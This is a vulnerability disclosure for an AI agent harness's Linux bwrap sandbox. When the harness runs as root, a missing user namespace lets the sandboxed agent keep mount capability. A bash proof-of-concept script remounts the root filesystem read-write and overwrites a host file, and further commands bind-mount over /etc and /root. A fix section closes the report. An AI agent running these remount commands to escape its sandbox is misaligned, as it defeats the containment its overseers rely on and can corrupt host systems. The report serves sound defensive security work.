# deepseek-harness Linux Sandbox Escape: mount/remount (root-only)

> **Disclosure Note**: The deepseek-harness repository provides no `SECURITY.md` and no vulnerability reporting channel, so developer acknowledgment could not be obtained. This report is not filed as a public issue (to avoid violating responsible-disclosure principles).

## 1. Summary

When deepseek-harness's Linux sandbox (bwrap backend) runs as root, its bwrap profile omits `--unshare-user`, so the sandboxed process retains CAP_SYS_ADMIN in the mount namespace. The sandboxed agent can therefore run `mount -o remount,rw /` (or `mount --bind` the workspace over `/etc`, or `mount tmpfs` over `/root`) and remount the read-only filesystem boundary read-write, writing/deleting any host file directly. This is a root-only sandbox escape (non-root receives "must be superuser" from the kernel), requiring no IPC and no daemon.

***\*Affected version\****: `0.1.0-rc.5` (commit `47f943859b`, 2026-08-13)

## 2. Detail

### 2.1 Attack Chain

1. The harness runs as root (container, CI, root login).
2. A sandboxed shell command runs inside bwrap (`--ro-bind / /` + `--bind <workspace>`, without `--unshare-user`).
3. Because no user namespace is created, the process retains root's CAP_SYS_ADMIN (mount capability).
4. The agent runs `mount -o remount,rw /` → the read-only bind mount is remounted read-write.
5. The agent writes/deletes any host file directly (no IPC, no daemon).

### 2.2 Vulnerable Code

| File | Line | Description |
|---|---|---|
| `packages/sandbox/sandbox-local/src/profiles.ts` | 17 | bwrap profile: `['--ro-bind','/','/','--dev','/dev','--proc','/proc','--die-with-parent']` — **no `--unshare-user`** |
| `native/landlock-run/packages/entry/src/main.c` | 254 | the landlock launcher only calls `prctl(PR_SET_NO_NEW_PRIVS)` — **no user namespace, no capability drop** |

**Root cause**: bwrap's `--unshare-user` (user namespace) is the mechanism that strips mount capability; omitting it leaves CAP_SYS_ADMIN in place when running as root, so `mount`/`remount` takes effect directly. The landlock backend likewise has no user namespace and retains mount capability when run as root.

## 3. Prerequisites

One prerequisite only, assuming no daemon, no network, no IPC:

| Prerequisite | Likelihood |
|---|---|
| harness runs as **root** (container / CI / root login) | common in containers and CI; rare on desktop |

Non-root is **unaffected** (verified: `mount` returns "must be superuser", write returns EROFS).

## 4. PoC

Run directly → Sandbox rejects.

```
"echo PWNED > '$TARGET'"
```

![image-20260814231115638](file://C:\Users\Z2621\AppData\Roaming\Typora\typora-user-images\image-20260814231115638.png?lastModify=1786720357)

Full script (mechanism-level reproduction; run as root — non-root is blocked by `must be superuser`):

```bash
#!/usr/bin/env bash
# deepseek-harness sandbox mount/remount escape PoC (root-only)
# Mechanism-level reproduction: runs the profiles.ts:17 bwrap args by hand
set -u
WS="/tmp/dsh-poc-ws"
TARGET="${1:-/root/flag.txt}"
BWRAP="bwrap --ro-bind / / --dev /dev --proc /proc --die-with-parent --tmpfs /tmp --bind $WS $WS --"
mkdir -p "$WS"
rm -f "$TARGET"; printf 'ORIGINAL\n' > "$TARGET"

echo "[1] direct write inside sandbox (expect: Read-only file system)"
$BWRAP sh -c "echo PWNED > '$TARGET'" 2>&1

echo "[2] remount / + write inside sandbox (expect: written)"
$BWRAP sh -c "mount -o remount,rw / && echo PWNED > '$TARGET'" 2>&1

echo "[result] $TARGET content = [$(cat "$TARGET" 2>/dev/null)]"
rm -f "$TARGET"; rmdir "$WS" 2>/dev/null
```

Expected output (root): `[1]` → Read-only file system, `[2]` → success, `[result]` → PWNED. Non-root: `[2]` → must be superuser, `[result]` → ORIGINAL.

![image-20260814231115638](file://C:\Users\Z2621\AppData\Roaming\Typora\typora-user-images\image-20260814231115638.png?lastModify=1786720371)

![image-20260814231135880](file://C:\Users\Z2621\AppData\Roaming\Typora\typora-user-images\image-20260814231135880.png?lastModify=1786720378)

Also confirmed as root: `mount --bind $WS /etc` and `mount -t tmpfs tmpfs /root` both exit 0.

## 5. Impact

Confirmed impact only:

- When running as root, the sandboxed agent can remount the root filesystem read-write and write/delete any host file, fully bypassing the `read-only`/`workspace-write` filesystem boundary.
- Cap is root (full system compromise).
- Non-root is unaffected.

## 6. CWE

- **CWE-653: Insufficient Compartmentalization** (primary) — the sandbox fails to isolate the process into a user namespace, retaining host-root mount capability.
- CWE-250: Execution with Unnecessary Privileges (related) — the sandboxed process runs with root + CAP_SYS_ADMIN.

## 7. Fix

1. Add `--unshare-user` (user namespace) to the bwrap profile so the sandboxed process drops CAP_SYS_ADMIN (consistent with Codex).
2. The landlock backend likewise needs a user namespace or an explicit capability drop.
